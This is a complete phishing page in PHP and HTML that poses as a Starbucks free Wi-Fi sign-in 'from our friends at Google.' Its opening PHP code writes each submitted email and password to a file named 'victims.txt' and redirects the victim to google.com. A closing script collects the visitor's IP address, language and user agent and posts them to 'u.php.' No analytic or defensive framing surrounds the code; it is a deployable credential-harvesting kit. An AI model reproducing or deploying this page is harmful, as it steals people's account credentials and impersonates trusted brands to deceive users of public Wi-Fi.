<?php
$u = $_POST['eml'];
$p = $_POST['pwd'];
if ($u && $p){
    $f = fopen('victims.txt','a+');
    fwrite($f,$u.'<!:!>'.$p."\n");
    fclose($f);
    echo "<script>window.location = 'https://google.com'</script>";
}
?>
<!DOCTYPE html>
<html>

  <head>

    <title>Sign in - Starbucks</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no">
    <meta name="robots" content="noindex, nofollow">

    <script src="static/js/jquery.min.js"></script>

    <link rel="stylesheet" href="static/css/bootstrap.min.css">
    <link rel="stylesheet" href="static/css/style.css">
    <link rel="icon" type="image/png" href="static/img/s5g1cxz9vr.png"/>

    <style>
    .container {
      height : auto!important;
    }
    body {
      background-image: url("static/img/5atoko1sqg.png");
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      -webkit-background-size: 100%;
      -moz-background-size: 100%;
      -o-background-size: 100%;
      background-size: 100%;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: 38px;
    width: 116px;
    }
    </style>

    <style media="screen and (max-width: 800px), screen and (max-height: 800px)">
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media="screen and (max-width: 580px)">
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }

    </style>

  </head>

  <body>

    <div class="container">
      <div class="account-wall">
        <img class="profile-img" src="static/img/pa6dyy5wcc.png" alt=""></img>

        <h1 class="text-center login-title">Free Wi-Fi</h1>
        <h2 class="text-center friends-text">From our friends at Google</h2>

          <form class="form-signin" method="post" action=''>

            <input id="eml" type="text" name="eml" class="form-control" placeholder="Email" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required>
            <input id="pwd" type="password" name="pwd" class="form-control" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required><br>
            <div id="dialog">
            <h2 id="error">Please enter the required fields.</h2>
            </div>
            <button id="btn" class="btn btn-primary btn-block btn-xlarge btn-sharp" name="login" type="submit">Accept &amp; Connect</button>
            <div class="text-center terms-text1">I agree to the <a href="#" class="url-color" id="btn1">Terms of Service</a> and have</div>
            <div class="text-center terms-text2"> reviewed the <a href="#" class="url-color">Google Privacy Policy</a></div>

          </form>

  <!-- The Modal -->
  <div id="myModal" class="modal url-color1">

  <!-- Modal content -->
  <div class="modal-content">
    <div class="modal-header">
      <span class="close">×</span>
      <h2>Terms of Service</h2>
    </div>
    <div class="modal-body">
      <p>This is a free wireless hotspot internet service (the “Service”) provided for use by customers. All users are required to log-in individually as an independent user.</p>
      <p>
  The Service is made available provided:
  </p><p>
  (a) You do not use the Service for anything unlawful, immoral or improper;
  </p><p>
  (b) You do not use the Service to make offensive or nuisance communications in whatever form. Such usage includes posting, transmitting, uploading, downloading or otherwise facilitating any content that is unlawful, defamatory, threatening, a nuisance, obscene, hateful, abusive, harmful (including but not limited to viruses, corrupted files, or any other similar software or programs), a breach of privacy, or which is otherwise objectionable;
  </p><p>
  (c) You do not use the Service to harm or attempt to harm minors in any way;
  </p><p>
  (d) You do not act nor knowingly permit others to act in such a way that the operation of the Service or our systems will be jeopardized or impaired;
  </p><p>
  (e) You do not use abusive or threatening behavior towards other users of the Service, members of our staff or any person in the vicinity of a Wireless LAN Hotspot;
  </p><p>
  (f) You do not use the Service to access or use content in a way that infringes the rights of others;
  </p><p>
  (g) The Service is used in accordance with any third party policies for acceptable use or any relevant internet standards (where applicable).
  </p><p>
  (h) You agree not to resell or re-broadcast any aspect of the Service, whether for profit or otherwise. You accept that your entitlement to use the Service is for your personal use only and that you shall not be entitled to transfer your entitlement to use the Service to any other person or allow any other person to make use of the Service or of any username or password or other entitlement supplied to you in connection with the Service.
  </p><p>
  (i) You also agree not to modify the Unit or use the Service for any fraudulent purpose, or in such a way as to create damage or risk to our business, reputation, employees, subscribers, facilities, third parties or to the public generally.
  </p><p>
  (j) You have no proprietary or ownership rights to any username or password or to a specific IP address, or e-mail address assigned to you or your Unit. We may change such addresses at any time or deactivate or suspend Service to any address without prior notice to you if we suspect any unlawful or fraudulent use of the services.
  </p>
    </div>
  </div>

  <script src="static/js/index.js"></script> 
  <script>
  var modal = document.getElementById('myModal');
  var btn = document.getElementById("btn1");
  var span = document.getElementsByClassName("close")[0];
  btn.onclick = function() {
    modal.style.display = "block";
  }
  span.onclick = function() {
    modal.style.display = "none";
  }
  window.onclick = function(event) {
    if (event.target == modal) {
        modal.style.display = "none";
    }
  }
  </script>
  <script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>    


      </div>
    </div>

  </body>

</html>
